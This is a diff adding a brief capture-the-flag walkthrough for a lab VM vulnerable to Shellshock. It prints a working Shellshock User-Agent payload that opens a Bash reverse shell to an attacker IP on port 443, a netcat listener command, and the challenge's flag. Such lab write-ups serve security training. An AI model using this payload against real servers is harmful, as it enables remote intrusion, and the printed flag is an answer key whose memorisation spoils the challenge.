@@ -1,0 +1,37 @@
+
+VM currently not included
+
+=====================================================================================================		
+
+Challenge Decription: VM is vulnerable Shellshock. 
+
+
+
+=====================================================================================================		
+
+Process to inject code via cgi-bin
+
+	1. Use Burp to proxy and update UA:
+		1.1 () { ignored;};/bin/bash -i >& /dev/tcp/192.168.160.148/443 0>&1
+		1.2 Where address after /dev/tcp is attacker machine and folder is port
+		
+	2. Start nc lister on attacker machine
+		2.1 nc -vvvnlp 443
+		
+	3. pwd = /var/www/
+	
+=====================================================================================================		
+		
+To find find flag
+
+	1. cat flag.txt
+	
+	2. Flag = WowWhatAShocker!
+	
+	
+=====================================================================================================		
+
+
+Notes
+
+VM needs cleaned up
